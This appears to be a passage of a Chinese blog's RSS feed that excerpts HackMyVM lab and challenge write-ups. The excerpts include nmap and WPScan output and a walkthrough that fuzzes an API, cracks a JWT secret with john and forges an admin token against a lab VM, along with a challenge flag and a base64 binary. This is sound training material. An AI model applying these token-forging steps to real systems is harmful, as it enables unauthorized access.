 | Location: http://192.168.205.142/wp-content/plugins/wp-query-console/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2018-03-16T16:03:00.000Z
 | Readme: http://192.168.205.142/wp-content/plugins/wp-query-console/README.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/wp-query-console/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WP Query Console &lt;= 1.0 - Unauthenticated Remote Code Execution
 |     References:
 |      - https://wpscan.com/vulnerability/f911568d-5f79-49b7-8ce4-fa0da3183214
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50498
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ae07ca12-e827-43f9-8cbb-275b9abbd4c3
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/wp-query-console/README.txt

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 15

[+] Finished: Wed Jan 15 20:39:16 2025
[+] Requests Done: 108575
[+] Cached Requests: 44
[+] Data Sent: 29.36 MB
[+] Data Received: 32.766 MB
[+] Memory used: 479.719 MB
[+] Elapsed time: 00:17:25

```

`wp-query-console`有漏洞，我们去搜索一下有没有利用方案。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_buster.html</guid><pubDate>Fri, 27 Jun 2025 09:32:41 +0000</pubDate></item><item><title>hmv_Blackhat2</title><link>https://7r1UMPHK.github.io/post/hmv_Blackhat2.html</link><description># hmv_Blackhat2

**靶机**：[HackMyVM - Blackhat2](https://hackmyvm.eu/machines/machine.php?vm=Blackhat2)
**难度**：黄色
**目标 IP**：192.168.205.218
**本机 IP**：192.168.205.141

## 1. 端口枚举及服务探测

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.218
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 21:27 CST
Nmap scan report for 192.168.205.218
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
MAC Address: 08:00:27:17:26:A8 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

从 `nmap` 扫描结果来看，目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Blackhat2.html</guid><pubDate>Fri, 27 Jun 2025 09:32:37 +0000</pubDate></item><item><title>hmv_azer</title><link>https://7r1UMPHK.github.io/post/hmv_azer.html</link><description># hmv_azer

# 0.简介

**靶机**：[hackmyvm - azer](https://hackmyvm.eu/machines/machine.php?vm=Azer)
**难度**：绿色
**目标 IP**：192.168.205.235
**本机 IP**：192.168.205.141

---

# 1.扫描

使用 `Nmap` 进行初步端口扫描，以识别开放的服务和端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS -p- -Pn -n -T4 192.168.205.235
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 11:19 CST
Nmap scan report for 192.168.205.235
Host is up (0.00038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:07:E9:02 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
                                                           
```

结果显示两个开放端口：

**80/tcp** - HTTP 服务
**3000/tcp** - 原始显示为 PPP，但实际上是一个 web 应用程序，用于用户认证

---

# 2.踩点

`80`端口页没有发现明显利用点，踩点`3000`端口

![image](https://github.com/user-attachments/assets/3b565e9c-e8cd-41ae-bf84-0cf6e7460d2e)

![image](https://github.com/user-attachments/assets/f2dcad05-b377-43e6-aa7b-159b04935536)

![image](https://github.com/user-attachments/assets/9ab7e04b-b4c3-4d36-9fdf-b4d1c827bf98)

在进一步探索中发现，**3000** 端口的应用程序似乎通过执行 `.sh` 脚本来进行密码验证。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_azer.html</guid><pubDate>Fri, 27 Jun 2025 09:32:35 +0000</pubDate></item><item><title>hmv_aurora</title><link>https://7r1UMPHK.github.io/post/hmv_aurora.html</link><description># hmv_aurora

# 0.简介

**靶机**：[hackmyvm - aurora](https://hackmyvm.eu/machines/machine.php?vm=aurora)
**难度**：绿色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 10:12 CST
Nmap scan report for 192.168.205.138
Host is up (0.00044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
MAC Address: 08:00:27:68:BD:31 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds
```

**3000**大概率是**web**页面

# 2.踩点

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/
&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
&lt;head&gt;
&lt;meta charset='utf-8'&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;Cannot GET /&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/
&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
&lt;head&gt;
&lt;meta charset='utf-8'&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;Cannot GET /&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;

```

禁止`GET`访问，那我们就`POST`

```bash
┌──(kali㉿kali)-[~/test]
└─$ feroxbuster -u 'http://192.168.205.138:3000' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -m POST
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.205.138:3000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, md]
 🏁  HTTP methods          │ [POST]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404     POST       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
401     POST        1l        2w       22c http://192.168.205.138:3000/login
400     POST        1l        6w       29c http://192.168.205.138:3000/register
401     POST        1l        2w       22c http://192.168.205.138:3000/Login
400     POST        1l        6w       29c http://192.168.205.138:3000/Register
401     POST        1l        1w       12c http://192.168.205.138:3000/execute

```

使用`curl`访问

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/login -X POST
Identifiants invalides                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/register -X POST
The 'role' field is not valid                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/execute -X POST 
Unauthorized                                                                                                                                    

```

我们注册一个用户试试

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'admin\'}'
Not authorized !
```

啊这，丢去`WFUZZ`爆破一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -c -u 'http://192.168.205.138:3000/register' -X POST -H 'Content-Type: application/json' -d '{\'role\':\'FUZZ\'}' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hw 6
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.138:3000/register
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000003:   401        0 L      3 W        16 Ch       'admin'                                                             
000000022:   500        0 L      5 W        32 Ch       'user'                                                              

Total time: 58.91045
Processed Requests: 62284
Filtered Requests: 62282
Requests/sec.: 1057.265

```

继续注册

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\'}' 
Column 'username' cannot be null                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\'}'
Column 'password' cannot be null                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\',\'password\':\'xxoo\'}'
Registration OK                                                                                                                                     
```

去登录试试

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/login -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\',\'password\':\'xxoo\'}'
{'accessToken':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4b28iLCJyb2xlIjoidXNlciIsImlhdCI6MTczNzU5OTM0OH0.Q8Q3R6Bu_xXUKSTcrGR01y5-hB4ndX7vL1ck1H7XomA'}
```

这很`jwt`，去尝试解码，[网站](https://jwt.io/)

![Image](https://github.com/user-attachments/assets/c55c1345-380f-4116-911b-b55fe1655ab6)

将密钥爆破一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4b28iLCJyb2xlIjoidXNlciIsImlhdCI6MTczNzU5OTM0OH0.Q8Q3R6Bu_xXUKSTcrGR01y5-hB4ndX7vL1ck1H7XomA' &gt; hash
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 512/512 AVX512BW 16x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
nopassword       (?)   
1g 0:00:00:00 DONE (2025-01-23 10:31) 100.0g/s 4915Kp/s 4915Kc/s 4915KC/s 123456..trudy
Use the '--show' option to display all of the cracked passwords reliably
Session completed.
```

改一下参数

![Image](https://github.com/user-attachments/assets/8c4fe2dd-1e58-4776-b407-e717b8dd3ef6)

尝试一下那个`execute`

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138:3000/execute -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk'
&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
&lt;head&gt;
&lt;meta charset='utf-8'&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;TypeError [ERR_INVALID_ARG_TYPE]: The &amp;quot;file&amp;quot; argument must be of type string. Received undefined&lt;br&gt; &amp;nbsp; &amp;nbsp;at validateString (internal/validators.js:120:11)&lt;br&gt; &amp;nbsp; &amp;nbsp;at normalizeSpawnArguments (child_process.js:411:3)&lt;br&gt; &amp;nbsp; &amp;nbsp;at spawn (child_process.js:547:16)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Object.execFile (child_process.js:237:17)&lt;br&gt; &amp;nbsp; &amp;nbsp;at exec (child_process.js:158:25)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/app.js:69:3&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/opt/login-app/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/opt/login-app/node_modules/express/lib/router/route.js:144:13)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/app.js:112:5&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/node_modules/jsonwebtoken/verify.js:261:12&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;

```

`Authorization` 头以 `Bearer` 开头。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_aurora.html</guid><pubDate>Fri, 27 Jun 2025 09:32:32 +0000</pubDate></item><item><title>hmv_Apaches</title><link>https://7r1UMPHK.github.io/post/hmv_Apaches.html</link><description># hmv_Apaches

# 0. 简介

**靶机**：[hackmyvm - Apaches](https://hackmyvm.eu/machines/machine.php?vm=Apaches)
**难度**：绿色
**目标 IP**：192.168.205.143
**本机 IP**：192.168.205.141

# 1. 扫描

首先，通过 `nmap` 对靶机进行全端口扫描，检查开放端口和服务：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 13:58 CST
Nmap scan report for 192.168.205.143
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:B2:79:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

从扫描结果可以看到，靶机开启了 **SSH** 和 **HTTP** 服务。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Apaches.html</guid><pubDate>Fri, 27 Jun 2025 09:32:30 +0000</pubDate></item><item><title>hmv_airbind</title><link>https://7r1UMPHK.github.io/post/hmv_airbind.html</link><description># hmv_airbind

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=airbind
**难度**：黄色
**目标 IP**：192.168.205.212
**本机** IP：192.168.205.141

---

### **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.212
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 17:39 CST
Nmap scan report for 192.168.205.212
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.57 ((Ubuntu))
MAC Address: 08:00:27:AD:E1:D7 (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/29%OT=80%CT=1%CU=32430%PV=Y%DS=1%DC=D%G=Y%M=0800
OS:27%TM=677118F6%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%
OS:II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11N
OS:W7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE8
OS:8%W6=FE88)ECN(R=Y%DF=Y%T=3F%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F
OS:%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.31 seconds
```

扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_airbind.html</guid><pubDate>Fri, 27 Jun 2025 09:32:26 +0000</pubDate></item><item><title>HackMyVM 油猴辅助脚本</title><link>https://7r1UMPHK.github.io/post/HackMyVM%20-you-hou-fu-zhu-jiao-ben.html</link><description>## 1. 起因 🤔

最近逛我博客的新朋友好像多了起来，不少人被安利去玩 **HackMyVM** 了。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/HackMyVM%20-you-hou-fu-zhu-jiao-ben.html</guid><pubDate>Fri, 27 Jun 2025 09:32:23 +0000</pubDate></item><item><title>eNSP 在 Windows 11 24H2 上的兼容性问题已通过 KB5053656 更新解决</title><link>https://7r1UMPHK.github.io/post/eNSP%20-zai-%20Windows%2011%2024H2%20-shang-de-jian-rong-xing-wen-ti-yi-tong-guo-%20KB5053656%20-geng-xin-jie-jue.html</link><description>## 问题背景

许多用户在将 Windows 11 操作系统升级到 **Version 24H2** 后，遇到了华为网络模拟平台 eNSP 无法正常工作的问题。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/eNSP%20-zai-%20Windows%2011%2024H2%20-shang-de-jian-rong-xing-wen-ti-yi-tong-guo-%20KB5053656%20-geng-xin-jie-jue.html</guid><pubDate>Fri, 27 Jun 2025 09:32:21 +0000</pubDate></item><item><title>Byxs20靶机渗透测试报告 (Write-Up)</title><link>https://7r1UMPHK.github.io/post/Byxs20-ba-ji-shen-tou-ce-shi-bao-gao-%20%28Write-Up%29.html</link><description>*   **靶机名称:** Byxs20 (内部测试 - 可能发布于 HackMyVm)
*   **难度:** 简单 (Easy)
*   **目标:** 获取 user.txt 和 root.txt 文件中的 flag。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Byxs20-ba-ji-shen-tou-ce-shi-bao-gao-%20%28Write-Up%29.html</guid><pubDate>Fri, 27 Jun 2025 09:32:18 +0000</pubDate></item><item><title>Challenge 012</title><link>https://7r1UMPHK.github.io/post/Challenge%20012.html</link><description># Challenge 012

# Challenge 012

**挑战链接:** https://hackmyvm.eu/challenges/challenge.php?c=012

![挑战图片](https://7r1umphk.github.io/image/20250518110545680.webp)

## 1. 初步分析

下载文件

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 012.zip 012.mp3 
-rwxr-xr-x 1 kali kali 17286 Mar  6  2022 012.mp3
-rwxr-xr-x 1 kali kali 16978 May 17 23:06 012.zip
```
首先尝试直接解压 `012.zip` 文件，解压出`012.mp3`
### 2 音频内容分析

通过播放 `012.mp3` 文件并仔细听取其内容。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20012.html</guid><pubDate>Fri, 27 Jun 2025 09:32:15 +0000</pubDate></item><item><title>Challenge 010</title><link>https://7r1UMPHK.github.io/post/Challenge%20010.html</link><description># 1. 初步分析

**挑战链接:** https://hackmyvm.eu/challenges/challenge.php?c=010

![挑战图片](https://7r1umphk.github.io/image/20250518105910057.webp)

## 1. 初步分析

挑战页面直接显示了一串看起来经过编码的字符串：

```
853-3GB.eOG[ko/A7oS$FF=
```

这串字符包含了大小写字母、数字以及一些特殊符号 (`-`, `.`, `[`, `]`, `/`, `$`, `=`)。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20010.html</guid><pubDate>Fri, 27 Jun 2025 09:32:13 +0000</pubDate></item><item><title>Challenge 008</title><link>https://7r1UMPHK.github.io/post/Challenge%20008.html</link><description># Challenge 008

# Challenge 008

**挑战链接:** https://hackmyvm.eu/challenges/challenge.php?c=008

![挑战图片](https://7r1umphk.github.io/image/20250518104404775.webp)

## 1. 初步分析

挑战提供了一个可下载文件：`008.zip`。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20008.html</guid><pubDate>Fri, 27 Jun 2025 09:32:09 +0000</pubDate></item><item><title>Challenge 023</title><link>https://7r1UMPHK.github.io/post/Challenge%20023.html</link><description>![image-20250612190323903](https://7r1umphk.github.io/image/202506121903204.webp)

```
022E296D100B1622455D0A16031B130C11
```

cisco type 7

https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html

![image-20250612190738406](https://7r1umphk.github.io/image/202506121907603.webp)

```
HMV{myciscoflag}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20023.html</guid><pubDate>Fri, 27 Jun 2025 09:32:07 +0000</pubDate></item><item><title>Challenge 022</title><link>https://7r1UMPHK.github.io/post/Challenge%20022.html</link><description>![image-20250612185701829](https://7r1umphk.github.io/image/202506121857127.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 022.zip 
-rwxr-xr-x 1 kali kali 197976 Jun 12 06:57 022.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 022.zip 
Archive:  022.zip
 extracting: 022.png                 
                    
```

![022](https://7r1umphk.github.io/image/202506121857563.webp)

https://www.dcode.fr/symbols-ciphers
打开列表找就完事了

![image-20250612185931605](https://7r1umphk.github.io/image/202506121859794.webp)

https://www.dcode.fr/birds-on-a-wire-cipher

![image-20250612190245248](https://7r1umphk.github.io/image/202506121902532.webp)

```
BLUEBIRD
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20022.html</guid><pubDate>Fri, 27 Jun 2025 09:32:05 +0000</pubDate></item><item><title>Challenge 021</title><link>https://7r1UMPHK.github.io/post/Challenge%20021.html</link><description>![image-20250612184142389](https://7r1umphk.github.io/image/202506121841690.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 021.zip 
-rwxr-xr-x 1 kali kali 3576 Jun 12 06:41 021.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ 7z x 021.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 3576 bytes (4 KiB)

Extracting archive: 021.zip
--
Path = 021.zip
Type = zip
Physical Size = 3576

Everything is Ok

Size:       21982
Compressed: 3576
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat 21.txt                                                          
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAcBAAAAAAAABAAAAAAAAAAAA3AAAAAAAAAAAAAEAAOAAN
AEAAHwAeAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAAAAAAAAgA
AAAAAAAAAwAAAAQAAAAYAwAAAAAAABgDAAAAAAAAGAMAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
AAAAAAABAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAGAAAAAAAAsAYAAAAAAAAAEAAA
AAAAAAEAAAAFAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAsQIAAAAAAACxAgAAAAAAAAAQAAAA
AAAAAQAAAAQAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAAAsAQAAAAAAACwBAAAAAAAAABAAAAAA
AAABAAAABgAAANAtAAAAAAAA0D0AAAAAAADQPQAAAAAAAFgCAAAAAAAAYAIAAAAAAAAAEAAAAAAA
AAIAAAAGAAAA4C0AAAAAAADgPQAAAAAAAOA9AAAAAAAA4AEAAAAAAADgAQAAAAAAAAgAAAAAAAAA
BAAAAAQAAAA4AwAAAAAAADgDAAAAAAAAOAMAAAAAAAAgAAAAAAAAACAAAAAAAAAACAAAAAAAAAAE
AAAABAAAAFgDAAAAAAAAWAMAAAAAAABYAwAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAAAFPl
dGQEAAAAOAMAAAAAAAA4AwAAAAAAADgDAAAAAAAAIAAAAAAAAAAgAAAAAAAAAAgAAAAAAAAAUOV0
ZAQAAABUIAAAAAAAAFQgAAAAAAAAVCAAAAAAAAAsAAAAAAAAACwAAAAAAAAABAAAAAAAAABR5XRk
BgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAFLldGQE
AAAA0C0AAAAAAADQPQAAAAAAANA9AAAAAAAAMAIAAAAAAAAwAgAAAAAAAAEAAAAAAAAAL2xpYjY0
L2xkLWxpbnV4LXg4Ni02NC5zby4yAAAAAAAEAAAAEAAAAAUAAABHTlUAAoAAwAQAAAABAAAAAAAA
AAQAAAAUAAAAAwAAAEdOVQCNEdhwtWSejKGgtndxYMH8U/HwUQQAAAAQAAAAAQAAAEdOVQAAAAAA
AwAAAAIAAAAAAAAAAAAAAAIAAAAIAAAAAQAAAAYAAAAAAIEAAAAAAAgAAAAAAAAA0WXObQAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAEgAAAAAAAAAAAAAAAAAAAAAAAABqAAAAIAAAAAAA
AAAAAAAAAAAAAAAAAAAiAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAEgAAAAAAAAAAAAAAAAAA
AAAAAACGAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAApAAAAEgAAAAAAAAAAAAAAAAAAAAAAAACVAAAA
IAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAIgAAAAAAAAAAAAAAAAAAAAAAAAAAX19jeGFfZmluYWxp
emUAX19saWJjX3N0YXJ0X21haW4Ac3RybGVuAF9faXNvYzk5X3NjYW5mAHByaW50ZgBsaWJjLnNv
LjYAR0xJQkNfMi43AEdMSUJDXzIuMi41AEdMSUJDXzIuMzQAX0lUTV9kZXJlZ2lzdGVyVE1DbG9u
ZVRhYmxlAF9fZ21vbl9zdGFydF9fAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAAAAAAgABAAMA
AwABAAQAAQADAAAAAAAAAAEAAwA/AAAAEAAAAAAAAAAXaWkNAAAEAEkAAAAQAAAAdRppCQAAAwBT
AAAAEAAAALSRlgYAAAIAXwAAAAAAAADQPQAAAAAAAAgAAAAAAAAAUBEAAAAAAADYPQAAAAAAAAgA
AAAAAAAAEBEAAAAAAAAgQAAAAAAAAAgAAAAAAAAAIEAAAAAAAADAPwAAAAAAAAYAAAABAAAAAAAA
AAAAAADIPwAAAAAAAAYAAAACAAAAAAAAAAAAAADQPwAAAAAAAAYAAAAFAAAAAAAAAAAAAADYPwAA
AAAAAAYAAAAHAAAAAAAAAAAAAADgPwAAAAAAAAYAAAAIAAAAAAAAAAAAAAAAQAAAAAAAAAcAAAAD
AAAAAAAAAAAAAAAIQAAAAAAAAAcAAAAEAAAAAAAAAAAAAAAQQAAAAAAAAAcAAAAGAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
